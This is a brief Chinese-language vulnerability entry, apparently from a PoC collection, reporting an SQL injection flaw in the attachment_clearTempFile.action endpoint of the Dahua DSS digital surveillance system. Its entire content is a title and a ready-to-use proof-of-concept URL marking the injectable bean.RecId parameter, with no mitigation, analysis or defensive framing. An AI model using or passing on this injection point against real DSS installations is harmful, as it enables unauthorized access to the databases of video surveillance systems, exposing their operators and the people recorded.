## 大华DSS数字监控系统attachment_clearTempFile.action存在SQL注入漏洞


## poc
```
http://ip/portal/attachment_clearTempFile.action?bean.RecId=1*&bean.TabName=1
```
